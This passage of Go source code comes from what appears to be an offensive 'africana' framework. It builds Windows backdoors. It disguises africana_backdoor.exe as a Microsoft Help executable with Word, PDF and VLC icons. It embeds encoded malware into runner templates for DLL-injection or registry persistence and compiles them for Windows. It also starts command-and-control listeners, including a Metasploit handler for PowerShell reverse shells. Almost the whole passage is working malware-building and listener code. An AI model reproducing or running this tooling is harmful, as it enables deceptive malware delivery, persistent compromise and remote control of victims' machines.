        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/access.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "autorun":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/autorun.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "pdf":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/pdf.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "project":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/project.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "publisher":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/publisher.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "powerpoint":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/powerpoint.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "rat":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/rat.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "vlc":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/vlc.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "word":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/word.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "visio":
        subprocess.Popen(`wine /root/.africana/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/windows/payload_templates/icons/visio.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    default:
        utils.SystemShell(userInput)
    }
}

func ListenerTcp(userC2 string, userLhostIp string, userLport string, userHport string) {
    if userC2 == "" {
        userC2 = ""
        }
    switch strings.ToLower(userC2) {
    case "ncat":
        subprocess.Popen(`rlwrap ncat -lnvp %s`, userLport)
    case "blackjack":
         subprocess.Popen(fmt.Sprintf("cd /root/.africana/africana-base/exploits/windows/blackjack/; python3 blackjack.py -q -i -n %s", userLport))
    case "metasploit":
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhostIp, userLport)
    default:
        utils.SystemShell(userInput)
    }
}

func ListenerHttp(userC2 string, userLhostIp string, userLport string, userHport string) {
    if userC2 == "" {
        userC2 = ""
        }
    switch strings.ToLower(userC2) {
    case "ncat":
        subprocess.Popen(`rlwrap ncat --ssl --ssl-key /root/.africana/certs/africana-key.pem --ssl-cert /root/.africana/certs/africana-cert.pem -lnvp %s`, userLport)
    case "blackjack":
         subprocess.Popen(fmt.Sprintf("cd /root/.africana/africana-base/exploits/windows/blackjack/; python3 blackjack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s", userLport, userHport))
    case "metasploit":
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhostIp, userLport)
    default:
        utils.SystemShell(userInput)
    }
}

 //dll persistence mechanisim//
func NoiseMakers() {
    //ShikataGanai()
    dllFilePath := "/root/.africana/africana-base/exploits/windows/payload_templates/injected_dlls/Secur32.dll"
    exeFilePath := "/root/.africana/output/malware_complete.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/windows/payload_templates/go_exploits/malware_runner_dll.go /root/.africana/output/malware_runner_dll.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/malware_runner_dll.go": {
        `africanas`: encodedExe,
        `africanax`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.africana/output/malware_runner_dll.go"
    endMalwarePath := "/root/.africana/output/africana_backdoor.exe"
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "hooking .exe with .dll for persistence!\n" + bcolors.DARKGREEN)
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    log.Printf(bcolors.GREEN + "\n[+] " + bcolors.ENDC + "complete backdoor saved at: " + bcolors.BLUE + "%s", endMalwarePath + bcolors.ENDC)
    ListenersLauncher()
}

//regestry persistence mechanisim//
func CodeBreakers() {
    //ShikataGanai()

    exeFilePath := "/root/.africana/output/malware_complete.exe"
    exeData, err := ioutil.ReadFile(exeFilePath)

    if err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/windows/payload_templates/go_exploits/malware_runner_reg.go /root/.africana/output/malware_runner_reg.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/malware_runner_reg.go": {
        `africanas`: encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.RED + "[!] " + bcolors.ENDC + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.africana/output/malware_runner_reg.go"
    endMalwarePath := "/root/.africana/output/africana_backdoor.exe"
    fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "hooking .exe with .dll for persistence!\n" + bcolors.DARKGREEN)
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    log.Printf(bcolors.GREEN + "\n[+] " + bcolors.ENDC + "complete backdoor saved at: " + bcolors.BLUE + "%s", endMalwarePath + bcolors.ENDC)
    ListenersLauncher()
}

func ListenersLauncher() {
    scanner := bufio.NewScanner(os.Stdin)
    userLhost, userLport, userHport, userListener, userC2 := userLhostIp, "9999", "3333", "tcp", "blackjack"

    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/listeners_launcher.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        fullInput := strings.Join(buildParts, " ")

        if len(buildParts) == 0 {
            continue
        }

        switch fullInput {
        case "banner":
            banners.RandomBanners()
            continue
        case "sleep":
            utils.Sleep()
            continue
        case "info":
            menus.HelpInfoBlackJack()
            continue
        case "v", "version":
            banners.Version()
            continue
        case "m", "menu":
            menus.BlackJackMenu()
            continue
        case "logs", "history":
            subprocess.LogHistory()
            continue
        case "o", "junks", "outputs":
            utils.ListJunks()
            continue
        case "? info", "help info":
            menus.HelpInfo()
            continue
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
            continue
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
            continue
        case "info set", "help set":
            menus.HelpInfoSet()
            continue
        case "clear junks", "clear outputs":
            utils.ClearJunks()
            continue
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
            continue
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
            continue
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
            continue
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
            continue
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
            continue
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
            continue
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
            continue
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
            continue
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
            continue
        case "option", "options", "show option", "show options":
            menus.BlackJackOptions()
            BlackJack()
            return
        }

        if buildParts[0] == "set" {
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            key, value := buildParts[1], buildParts[2]
            switch key {
            case "lhost":
                if value == "" {
                    value = userLhostIp
                }
                userLhost = value
            case "lport":
                if value == "" {
                    value = "9999"
                }
                userLport = value
            case "hport":
                if value == "" {
                    value = "3333"
                }
                userHport = value
            case "listener":
                if value == "" {
                    value = "tcp"
                }
                userListener = value
            case "c2":
                if value == "" {
                    value = "blackjack"
                }
                userC2 = value
            default:
                menus.HelpInfoSet()
                continue
            }
            fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
            continue
        }
        
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nLISTENER => %s\n", userLhost, userLport, userHport, userListener)
            if userListener == "tcp" {
                fmt.Println()
                ListenerTcp(userC2 , userLhostIp, userLport, userHport)
            } else if userListener == "http" || userListener == "https" {
                fmt.Println()
                ListenerHttp(userC2 , userLhostIp, userLport, userHport)
            } else {
                fmt.Println(bcolors.RED + "[!] " + bcolors.ENDC + "Error: Invalid listener type. Use tcp or http/https")
            }
            continue
        }
        utils.SystemShell(userInput)
    }
}
